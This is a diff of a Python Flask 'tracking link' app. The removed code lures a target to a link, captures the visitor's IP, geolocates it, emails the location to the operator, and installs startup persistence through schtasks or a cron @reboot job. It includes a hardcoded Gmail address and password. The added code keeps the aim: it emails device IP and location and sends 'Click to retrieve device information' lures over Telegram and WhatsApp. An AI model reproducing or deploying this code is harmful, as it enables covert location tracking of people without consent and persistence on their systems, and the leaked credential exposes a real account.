@@ -1,104 +1,105 @@
-import os
-import platform
-import requests
-import smtplib
-import subprocess
-from time import sleep
-from flask import Flask, request
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
+# app.py
 
-app = Flask(__name__)
+import os
+from flask import Flask, request, jsonify
+import smtplib
+import requests
+from dotenv import load_dotenv
+
+# Load environment variables from a custom file named config.env
+load_dotenv("config.env")
+
+# Configuration Settings
+APP_NAME = "App"  # Application name changed to "App"
+DEBUG = True
+
+# Server settings
+SERVER_HOST = "0.0.0.0"  # Listen on all available IP addresses
+SERVER_PORT = 5000
 
 # Email configuration
-EMAIL_ADDRESS = "joeperry05i2@gmail.com"  # Replace with your email
-EMAIL_PASSWORD = "Aq@5gY8Vb"  # Replace with your email password
-RECEIVER_EMAIL = "receiver_email@gmail.com"  # Replace with your recipient email
+EMAIL_HOST = os.getenv("EMAIL_HOST", "smtp.gmail.com")
+EMAIL_PORT = int(os.getenv("EMAIL_PORT", 587))
+EMAIL_USER = os.getenv("EMAIL_USER", "your-email@gmail.com")
+EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD", "your-password")
 
-# Tracking link configuration
-TRACKING_URL = "http://your_public_server_url.com"  # Replace with your actual public server URL
+# WhatsApp and Telegram settings
+WHATSAPP_API_KEY = os.getenv("WHATSAPP_API_KEY", "your-whatsapp-api-key")
+TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "your-telegram-bot-token")
+TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "your-telegram-chat-id")
 
-def send_email(ip_address, location_info):
-    """Sends an email with the captured IP and location information."""
-    subject = "Device Location Accessed"
-    body = f"""
-    Device accessed the tracking link:
-    
-    IP Address: {ip_address}
-    Country: {location_info.get('country', 'N/A')}
-    Region: {location_info.get('region', 'N/A')}
-    City: {location_info.get('city', 'N/A')}
-    Latitude: {location_info.get('lat', 'N/A')}
-    Longitude: {location_info.get('lon', 'N/A')}
-    """
+# IP and Location Tracking API
+IP_API_URL = "https://ipinfo.io/json"
+GEO_API_KEY = os.getenv("GEO_API_KEY", "your-geo-api-key")
 
-    msg = MIMEMultipart()
-    msg['From'] = EMAIL_ADDRESS
-    msg['To'] = RECEIVER_EMAIL
-    msg['Subject'] = subject
-    msg.attach(MIMEText(body, 'plain'))
+# Persistence settings
+PERSISTENCE_INTERVAL = int(os.getenv("PERSISTENCE_INTERVAL", 60))
 
+# Flask app initialization
+app = Flask(APP_NAME)
+
+# Function to send email with captured information
+def send_email(subject, body):
     try:
-        with smtplib.SMTP("smtp.gmail.com", 587) as server:
+        with smtplib.SMTP(EMAIL_HOST, EMAIL_PORT) as server:
             server.starttls()
-            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
-            server.send_message(msg)
+            server.login(EMAIL_USER, EMAIL_PASSWORD)
+            message = f"Subject: {subject}\n\n{body}"
+            server.sendmail(EMAIL_USER, EMAIL_USER, message)
         print("Email sent successfully.")
     except Exception as e:
-        print(f"Error sending email: {e}")
+        print("Error sending email:", e)
 
-@app.route('/')
-def capture_info():
-    ip_address = request.remote_addr
-    geo_response = requests.get(f"http://ip-api.com/json/{ip_address}")
-    geo_data = geo_response.json()
+# Endpoint to retrieve IP and location
+@app.route('/get_info', methods=['GET'])
+def get_info():
+    try:
+        response = requests.get(IP_API_URL)
+        data = response.json()
+        ip_address = data.get("ip", "N/A")
+        location = data.get("loc", "N/A")
+        info = f"IP Address: {ip_address}, Location: {location}"
+        
+        # Send the info via email
+        send_email("Device IP and Location", info)
+        
+        return jsonify({"status": "success", "info": info})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)})
 
-    location_info = {
-        'ip': ip_address,
-        'country': geo_data.get('country', 'N/A'),
-        'region': geo_data.get('regionName', 'N/A'),
-        'city': geo_data.get('city', 'N/A'),
-        'lat': geo_data.get('lat', 'N/A'),
-        'lon': geo_data.get('lon', 'N/A')
+# Function to send a message with a link via Telegram
+def send_telegram_message(message, link):
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    payload = {
+        "chat_id": TELEGRAM_CHAT_ID,
+        "text": f"{message} {link}"
     }
+    requests.post(url, json=payload)
 
-    print(f"Captured data: {location_info}")
-    send_email(ip_address, location_info)
+# Function to send a WhatsApp message (assumes a WhatsApp API provider)
+def send_whatsapp_message(message, link):
+    url = f"https://api.whatsapp.com/send?phone={WHATSAPP_API_KEY}"
+    payload = {
+        "body": f"{message} {link}"
+    }
+    headers = {
+        "Authorization": f"Bearer {WHATSAPP_API_KEY}"
+    }
+    requests.post(url, json=payload, headers=headers)
 
-    return "Thank you for visiting!", 200
+# Endpoint to trigger messages to WhatsApp and Telegram
+@app.route('/send_link', methods=['POST'])
+def send_link():
+    data = request.get_json()
+    link = data.get("link", "https://example.com/retrieve")
+    message = "Click to retrieve device information:"
 
-def generate_tracking_link():
-    print(f"Send this link to the target: {TRACKING_URL}")
+    # Send messages
+    send_telegram_message(message, link)
+    send_whatsapp_message(message, link)
 
-def schedule_task():
-    """Configures the program to run persistently on system startup."""
-    system = platform.system()
-    if system == "Windows":
-        # Windows: Configure Task Scheduler to restart the program on startup
-        task_name = "PersistentFlaskApp"
-        subprocess.run([
-            "schtasks", "/create", "/tn", task_name, "/tr", f'python "{os.path.abspath(__file__)}"', "/sc", "onlogon"
-        ])
-        print("Scheduled task created to run on Windows startup.")
-    elif system == "Linux" or system == "Darwin":
-        # Linux/Mac: Configure a cron job to restart the program on reboot
-        cron_job = f"@reboot python3 {os.path.abspath(__file__)} &\n"
-        with open("/tmp/temp_cron", "w") as f:
-            f.write(cron_job)
-        subprocess.run("crontab /tmp/temp_cron", shell=True)
-        os.remove("/tmp/temp_cron")
-        print("Cron job created to run on system startup.")
+    return jsonify({"status": "success", "message": "Links sent to WhatsApp and Telegram."})
 
-def start_server_with_retries():
-    """Starts the Flask server with automatic retries on failure."""
-    while True:
-        try:
-            app.run(host="0.0.0.0", port=5000)
-        except Exception as e:
-            print(f"Server error: {e}. Restarting server in 5 seconds...")
-            sleep(5)
-
-if __name__ == '__main__':
-    generate_tracking_link()
-    schedule_task()  # Set up the application to run on system startup
-    start_server_with_retries()  # Start the server with retry on failure
+# Run the app
+if __name__ == "__main__":
+    app.run(host=SERVER_HOST, port=SERVER_PORT, debug=DEBUG)
